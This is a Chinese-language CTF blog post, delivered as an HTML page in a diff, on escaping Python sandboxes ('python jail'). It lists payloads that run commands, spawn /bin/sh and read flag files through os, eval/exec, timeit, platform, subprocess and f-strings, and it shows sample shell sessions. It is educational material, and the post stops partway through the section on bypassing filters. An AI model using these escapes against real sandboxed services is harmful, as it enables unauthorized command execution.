@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    
+    
+    <title>Escape from python-jail | Room of Requirement | pwn what you want</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="pwn,python">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="/css/third-party/swipebox.min.css?v=1.3.2">
+    <link rel="stylesheet" href="/css/style.css?v=1.3.2">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"siriuswhiter","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Sirius Whiter</h5>
+          <a href="mailto:xuewenjie2017@outlook.com" title="xuewenjie2017@outlook.com" class="mail">
+            
+              <span>x</span>
+            
+              <span>u</span>
+            
+              <span>e</span>
+            
+              <span>w</span>
+            
+              <span>e</span>
+            
+              <span>n</span>
+            
+              <span>j</span>
+            
+              <span>i</span>
+            
+              <span>e</span>
+            
+              <span>2</span>
+            
+              <span>0</span>
+            
+              <span>1</span>
+            
+              <span>7</span>
+            
+              <span>@</span>
+            
+              <span>o</span>
+            
+              <span>u</span>
+            
+              <span>t</span>
+            
+              <span>l</span>
+            
+              <span>o</span>
+            
+              <span>o</span>
+            
+              <span>k</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/siriuswhiter" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                ABOUT
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="https://github.com/siriuswhiter" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        
+	
+<header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>Escape from python-jail</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">Escape from python-jail</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-04-08T13:05:19.000Z" itemprop="datePublished" class="page-time">
+  2019-04-08
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/pwn/">pwn</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+
+
+<div class="container body-wrap">
+    <article id="post-escape-from-python-jail"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">Escape from python-jail</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-04-08 21:05:19" datetime="2019-04-08T13:05:19.000Z"  itemprop="datePublished">2019-04-08</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/pwn/">pwn</a></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <h1 id="python-沙盒"><a href="#python-沙盒" class="headerlink" title="python 沙盒"></a>python 沙盒</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>python沙盒逃逸其实就是如何通过绕过限制，拿到出题人或者安全运维人员不想让我们拿到的”危险函数”，或者绕过Python终端达到命令执行的效果。</p>
+<p>从这个角度来讲，沙盒逃逸本身更像是偏web的东西，就像是sql注入在被过滤的剩余字符中通过骚操作来执行不该被执行的命令一样。</p>
+<h2 id="任意执行命令的一些函数和模块"><a href="#任意执行命令的一些函数和模块" class="headerlink" title="任意执行命令的一些函数和模块"></a>任意执行命令的一些函数和模块</h2><ol start="0">
+<li><strong>import</strong> 函数</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&apos;os&apos;).system(&apos;dir&apos;)</span><br></pre></td></tr></table></figure>
+<ol>
+<li>os 模块</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">os.system(&quot;/bin/sh&quot;)</span><br><span class="line"></span><br><span class="line">os.popen(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure>
+<p>很少不被禁，不然很容易被利用getshell<br>官方文档 <a href="https://docs.python.org/2/library/os.html" target="_blank" rel="noopener">https://docs.python.org/2/library/os.html</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; os.system(&quot;/bin/sh&quot;)</span><br><span class="line">$ whoami</span><br><span class="line">sirius</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>exec &amp; eval 函数</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;)</span><br><span class="line"></span><br><span class="line">exec(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;)</span><br></pre></td></tr></table></figure>
+<p>两个执行函数，没什么可说的。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; eval(&apos;__import__(&quot;os&quot;).system(&quot;/bin/sh&quot;)&apos;)</span><br><span class="line">$ whoami</span><br><span class="line">sirius</span><br></pre></td></tr></table></figure></p>
+<ol start="3">
+<li>execfile 函数</li>
+</ol>
+<p>执行文件，主要用于引入模块来执行命令<br>python3不存在</p>
+<ol start="4">
+<li>timeit 函数 from timeit 模块</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import timeit</span><br><span class="line">timeit.timeit(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;,number=1)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import timeit</span><br><span class="line">&gt;&gt;&gt; timeit.timeit(&apos;__import__(&quot;os&quot;).system(&quot;sh&quot;)&apos;,number=1)</span><br><span class="line">$ whoami</span><br><span class="line">sirius</span><br></pre></td></tr></table></figure>
+<ol start="5">
+<li>platform 模块</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import platform </span><br><span class="line">print platform.popen(&apos;dir&apos;).read()</span><br></pre></td></tr></table></figure>
+<p>platform提供了很多方法去获取操作系统的信息，popen函数可以执行任意命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import platform </span><br><span class="line">&gt;&gt;&gt; print platform.popen(&apos;dir&apos;).read()</span><br><span class="line">jail.py</span><br></pre></td></tr></table></figure>
+<ol start="6">
+<li>Filetype 函数 from types 模块</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import types</span><br><span class="line">print types.FileType(&quot;flag&quot;).read()</span><br></pre></td></tr></table></figure>
+<p>可以用来读取文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import types</span><br><span class="line">&gt;&gt;&gt; print types.FileType(&quot;flag&quot;).read()</span><br><span class="line">flag_here</span><br></pre></td></tr></table></figure></p>
+<ol start="7">
+<li>commands 模块</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import commands</span><br><span class="line">print commands.getoutput(&quot;dir&quot;)</span><br><span class="line">print commands.getstatusoutput(&quot;dir&quot;)</span><br></pre></td></tr></table></figure>
+<p>依旧可以用来执行部分指令，貌似不可以拿shell，但其他的很多都可以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import commands</span><br><span class="line">&gt;&gt;&gt; print commands.getoutput(&quot;dir&quot;)</span><br><span class="line">flag  jail.py</span><br><span class="line">&gt;&gt;&gt; print commands.getstatusoutput(&quot;dir&quot;)</span><br><span class="line">(0, &apos;flag  jail.py&apos;)</span><br></pre></td></tr></table></figure>
+<ol start="8">
+<li>subprocess模块</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">subprocess.call([&apos;ls&apos;],shell=True)</span><br></pre></td></tr></table></figure>
+<p>shell=True 命令本身被bash启动，支持shell启动，否则不支持</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import subprocess</span><br><span class="line">&gt;&gt;&gt; subprocess.call([&apos;ls&apos;],shell=True)</span><br><span class="line">flag  jail.py</span><br></pre></td></tr></table></figure>
+<ol start="9">
+<li>compile 函数</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>菜鸟：<a href="http://www.runoob.com/python/python-func-compile.html" target="_blank" rel="noopener">http://www.runoob.com/python/python-func-compile.html</a></p>
+<ol start="10">
+<li>f修饰符</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f&apos;&#123;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#125;&apos;</span><br></pre></td></tr></table></figure>
+<p>python 3.6加上的新特性，用f,F修饰的字符串可以执行代码。</p>
+<p>关于python内部查看版本号，可以使用sys模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import sys</span><br><span class="line">&gt;&gt;&gt; print sys.version</span><br><span class="line">2.7.12 (default, Nov 12 2018, 14:36:49) </span><br><span class="line">[GCC 5.4.0 20160609]</span><br></pre></td></tr></table></figure>
+<h2 id="绕过检查"><a href="#绕过检查" class="headerlink" title="绕过检查"></a>绕过检查</h2><h3 id="import-os-引入"><a href="#import-os-引入" class="headerlink" title="import / os 引入"></a>import / os 引入</h3><ol>
+<li>加解密绕过</li>
+</ol>
+<p>使用 python 内置函数 <strong>builtins</strong> (该函数模块中的函数都被自动引入，不需要再单独引入) , dir(<strong>builtins</strong>) 查看剩余可用内置函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; dir(__builtins__)</span><br><span class="line">[&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;, &apos;UnicodeEncodeError&apos;, &apos;UnicodeError&apos;, &apos;UnicodeTranslateError&apos;, &apos;UnicodeWarning&apos;, &apos;UserWarning&apos;, &apos;ValueError&apos;, &apos;Warning&apos;, &apos;ZeroDivisionError&apos;, &apos;__debug__&apos;, &apos;__doc__&apos;, &apos;__import__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;abs&apos;, &apos;all&apos;, &apos;any&apos;, &apos;apply&apos;, &apos;basestring&apos;, &apos;bin&apos;, &apos;bool&apos;, &apos;buffer&apos;, &apos;bytearray&apos;, &apos;bytes&apos;, &apos;callable&apos;, &apos;chr&apos;, &apos;classmethod&apos;, &apos;cmp&apos;, &apos;coerce&apos;, &apos;compile&apos;, &apos;complex&apos;, &apos;copyright&apos;, &apos;credits&apos;, &apos;delattr&apos;, &apos;dict&apos;, &apos;dir&apos;, &apos;divmod&apos;, &apos;enumerate&apos;, &apos;eval&apos;, &apos;execfile&apos;, &apos;exit&apos;, &apos;file&apos;, &apos;filter&apos;, &apos;float&apos;, &apos;format&apos;, &apos;frozenset&apos;, &apos;getattr&apos;, &apos;globals&apos;, &apos;hasattr&apos;, &apos;hash&apos;, &apos;help&apos;, &apos;hex&apos;, &apos;id&apos;, &apos;input&apos;, &apos;int&apos;, &apos;intern&apos;, &apos;isinstance&apos;, &apos;issubclass&apos;, &apos;iter&apos;, &apos;len&apos;, &apos;license&apos;, &apos;list&apos;, &apos;locals&apos;, &apos;long&apos;, &apos;map&apos;, &apos;max&apos;, &apos;memoryview&apos;, &apos;min&apos;, &apos;next&apos;, &apos;object&apos;, &apos;oct&apos;, &apos;open&apos;, &apos;ord&apos;, &apos;pow&apos;, &apos;print&apos;, &apos;property&apos;, &apos;quit&apos;, &apos;range&apos;, &apos;raw_input&apos;, &apos;reduce&apos;, &apos;reload&apos;, &apos;repr&apos;, &apos;reversed&apos;, &apos;round&apos;, &apos;set&apos;, &apos;setattr&apos;, &apos;slice&apos;, &apos;sorted&apos;, &apos;staticmethod&apos;, &apos;str&apos;, &apos;sum&apos;, &apos;super&apos;, &apos;tuple&apos;, &apos;type&apos;, &apos;unichr&apos;, &apos;unicode&apos;, &apos;vars&apos;, &apos;xrange&apos;, &apos;zip&apos;]</span><br></pre></td></tr></table></figure>
+<p>这里是在没有禁用函数时的情况， 可以看到里面有一些一般不会禁用的函数比如说对文件的操作函数 open，int，chr等，还有dict函数</p>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-04-22T12:30:32.941Z" itemprop="dateUpdated">2019-04-22 20:30:32</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2019/04/08/escape-from-python-jail/" target="_blank" rel="external">http://siriuswhiter.tk/2019/04/08/escape-from-python-jail/</a>
+        
+    </div>
+    <footer>
+        <a href="http://siriuswhiter.tk">
+            <img src="/img/avatar.jpg" alt="Sirius Whiter">
+            Sirius Whiter
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2019/04/08/escape-from-python-jail/&title=《Escape from python-jail》 — Room of Requirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2019/04/08/escape-from-python-jail/&title=《Escape from python-jail》 — Room of Requirement&source=pwn菜鸡一枚" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/2019/04/22/信安大赛2019-pwn/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">信安大赛2019-pwn</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="next">
+      <a href="/2019/04/06/攻防世界-pwn-prac/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">攻防世界-pwn prac</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#python-沙盒"><span class="post-toc-number">1.</span> <span class="post-toc-text">python 沙盒</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#原理"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">原理</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#任意执行命令的一些函数和模块"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">任意执行命令的一些函数和模块</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#绕过检查"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">绕过检查</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#import-os-引入"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">import / os 引入</span></a></li></ol></li></ol></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        请我喝奶茶呀
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+</div>
+
+        <footer class="footer">
+    
+    <div class="top">
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Sirius Whiter &copy; 2018 - 2019
+            </span>
+        		
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2019/04/08/escape-from-python-jail/&title=《Escape from python-jail》 — Room of Requirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2019/04/08/escape-from-python-jail/&title=《Escape from python-jail》 — Room of Requirement&source=pwn菜鸡一枚" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACJ0lEQVR42u3aQW7DMAxE0dz/0ummiwJF5D+kHUDU96pIFNuviwEl8vXC1/vP1fn8/5r0V61LhgwZ2zLey4us+fRgvr72XBkyZJzGWAciWfPpVwTcf64MGTJkdNakkS1DhgwZTzM6+NodZMiQcQ6Dh2C/7COb1Qf34jJkyNiQwU/dv//3I/0NGTJkbMV4hxc/Vlt/ftf7/N5ThgwZoxk84NKSMQ3xdNhChgwZpzH48Vltw8lfJR07CypZGTJkjGDwA3rCSIOy1tq86HLIkCFjBIO/XFqode5AIluGDBlnMvqx2En9tChEu3AZMmSMY3SKtn5bdM27iG8ZMmQcwEgjch3T/IXISlR0ypAh4wAGCcH+hpbgi9EsQ4aMAxidB9dGwWol4MVAmAwZMoYySAnYD1neNihOiMiQIWM0o3asn7Y8awEdD1vIkCFjKINnVzoqwalBqxJ/K0OGjHkMXor1hy3W/6B0AyxDhozTGP1wTNO9Nmxx88iFDBkytmXwjSsvH2stgfWdgy6HDBkyRjDiI61bI5u8CQpcGTJkjGbw4/v01XnrtBbZMmTImM2oHZylQxu8tZmWqjJkyDiBwS+CSQu+Gi8tW2XIkDGDkY6F3du2TEc34p20DBkyBjHuDUqOr21iZciQIaPVSlyGZtraRAAZMmTIAGv4t+lgGT+MkyFDxgkMvh1Nt5rpqNkjjUwZMmRszki3jiQcSQR3ys1iU1OGDBn7MX4Ay3X6CCBAqA4AAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/plugins/jquery.swipebox.min.js?v=1.3.2"></script>
+<script type="text/javascript" color="255,0,0"opacity="0.3"count="70" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.3.2"></script>
+
+<!-- third-party -->
+<script type="text/javascript">
+;( function( $ ) {
+
+	$( '.swipebox' ).swipebox({
+		hideCloseButtonOnMobile: true
+	});
+
+} )( jQuery );
+</script>
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.3.2"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+
+
+    
+</body>
+</html>
